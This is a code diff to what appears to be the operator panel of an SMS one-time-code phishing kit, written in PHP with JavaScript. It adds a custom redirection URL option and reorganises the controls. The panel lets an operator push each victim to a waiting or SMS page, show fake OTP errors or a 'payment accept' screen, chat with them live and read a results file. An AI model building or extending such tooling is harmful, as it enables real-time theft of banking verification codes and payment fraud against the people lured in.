@@ -79,8 +79,8 @@ $currentRoute = $currentState['instruction'] === 'stay_wait' ? 'waiting' : 'sms'
 $currentSmsAction = 'show_sms_error';
 if ($currentState['mode'] === 'payment_accept' || $currentState['instruction'] === 'otp_pass') {
     $currentSmsAction = 'show_payment_accept';
-} elseif ($currentState['mode'] === 'redirect_wait') {
-    $currentSmsAction = 'redirect_error';
+} elseif ($currentState['mode'] === 'redirect_custom' || $currentState['mode'] === 'redirect_wait') {
+    $currentSmsAction = 'redirection_url';
 }
 $chatLog = $selectedUserId !== '' ? panelLoadChat($selectedUserId) : [];
 $resultsContent = file_exists($resultsFile) ? file_get_contents($resultsFile) : '';
@@ -129,7 +129,6 @@ $resultsContent = file_exists($resultsFile) ? file_get_contents($resultsFile) : 
                     <input type="hidden" name="user_id" value="<?php echo htmlspecialchars($selectedUserId); ?>">
                     <input type="hidden" name="sms_mode" id="sms_mode" value="default">
                     <input type="hidden" name="instruction" id="instruction" value="stay_wait">
-                    <input type="hidden" name="custom_url" value="">
                     <div class="row-group">
                         <div class="row"><label>Control route</label><select id="control_route" class="admin-select">
                             <?php foreach (['waiting'=>'Send user to Waiting page','sms'=>'Send user to SMS page'] as $k=>$v): ?>
@@ -138,24 +137,20 @@ $resultsContent = file_exists($resultsFile) ? file_get_contents($resultsFile) : 
                         </select>
                         <div class="row-hint">First choose where the user should be directed.</div></div>
                         <div class="row hidden" id="sms-actions-row"><label>SMS action</label><select id="sms_action" class="admin-select">
-                            <?php foreach (['show_sms_error'=>'Show SMS error','redirect_error'=>'Redirect with error','show_payment_accept'=>'Show payment accept'] as $k=>$v): ?>
+                            <?php foreach (['show_sms_error'=>'Show SMS error','redirection_url'=>'Redirection URL','show_payment_accept'=>'Show payment accept'] as $k=>$v): ?>
                                 <option value="<?php echo $k; ?>" <?php echo $currentSmsAction===$k?'selected':''; ?>><?php echo $v; ?></option>
                             <?php endforeach; ?>
                         </select>
                         <div class="row-hint">This menu appears only when SMS is selected.</div></div>
                     </div>
-                    <div class="row"><label>Custom error message</label><textarea name="custom_error" class="chat-input-wide" placeholder="Write a custom error message for SMS page..." ><?php echo htmlspecialchars($currentState['custom_error'] ?? ''); ?></textarea></div>
-                    <div class="row"><label>Instruction (legacy)</label><select disabled class="admin-select">
-                        <?php foreach (['stay_wait'=>'Keep user on waiting page','prompt_otp'=>'Send user to sms.php','otp_error'=>'Send OTP error','otp_pass'=>'Show SMS pass'] as $k=>$v): ?>
-                            <option value="<?php echo $k; ?>" <?php echo $currentState['instruction']===$k?'selected':''; ?>><?php echo $v; ?></option>
-                        <?php endforeach; ?>
-                    </select></div>
-                    <div class="row"><label><input type="checkbox" name="chat_enabled" value="1" <?php echo !empty($currentState['chat_enabled'])?'checked':''; ?>> Enable chat for this user</label></div>
+                    <div class="row hidden" id="custom-url-row"><label>Redirection URL</label><input type="text" name="custom_url" id="custom_url" placeholder="https://example.com/redirect" value="<?php echo htmlspecialchars($currentState['custom_url'] ?? ''); ?>"></div>
+                    <div class="row hidden" id="custom-error-row"><label>Custom error message</label><textarea name="custom_error" class="chat-input-wide" placeholder="Write a custom error message for SMS page..."><?php echo htmlspecialchars($currentState['custom_error'] ?? ''); ?></textarea></div>
                     <button type="submit">Apply Update</button>
                 </form>
             </div>
             <div class="card" style="margin-top:12px">
                 <h3>Live Chat</h3>
+                <div class="row"><label><input type="checkbox" name="chat_enabled" value="1" form="sms-form" <?php echo !empty($currentState['chat_enabled'])?'checked':''; ?>> Enable chat for this user</label></div>
                 <div class="chat-box" id="chat-box">
                     <?php if (empty($chatLog)): ?><div class="meta">No messages yet.</div><?php endif; ?>
                     <?php foreach ($chatLog as $entry): ?>
@@ -185,19 +180,36 @@ const smsActionsRow = document.getElementById('sms-actions-row');
 const smsAction = document.getElementById('sms_action');
 const smsModeField = document.getElementById('sms_mode');
 const instructionField = document.getElementById('instruction');
+const customUrlRow = document.getElementById('custom-url-row');
+const customErrorRow = document.getElementById('custom-error-row');
+const customUrlField = document.getElementById('custom_url');
 
 function syncControlState(){
     if(!controlRoute||!smsModeField||!instructionField){return;}
     const route = controlRoute.value;
     const action = smsAction ? smsAction.value : 'show_sms_error';
+    const isSmsRoute = route === 'sms';
+    const showCustomUrl = isSmsRoute && action === 'redirection_url';
+    const showCustomError = isSmsRoute && action === 'show_sms_error';
 
     if (smsActionsRow) {
-        smsActionsRow.classList.toggle('hidden', route !== 'sms');
+        smsActionsRow.classList.toggle('hidden', !isSmsRoute);
+    }
+
+    if (customUrlRow) {
+        customUrlRow.classList.toggle('hidden', !showCustomUrl);
+    }
+
+    if (customErrorRow) {
+        customErrorRow.classList.toggle('hidden', !showCustomError);
     }
 
     if(route === 'waiting'){
         instructionField.value = 'stay_wait';
         smsModeField.value = 'default';
+        if(customUrlField){
+            customUrlField.value = '';
+        }
         return;
     }
 
@@ -205,9 +217,8 @@ function syncControlState(){
     if(action === 'show_payment_accept'){
         smsModeField.value = 'payment_accept';
         instructionField.value = 'otp_pass';
-    } else if(action === 'redirect_error'){
-        smsModeField.value = 'redirect_wait';
-        instructionField.value = 'otp_error';
+    } else if(action === 'redirection_url'){
+        smsModeField.value = 'redirect_custom';
     } else {
         smsModeField.value = 'error_verification';
         instructionField.value = 'otp_error';
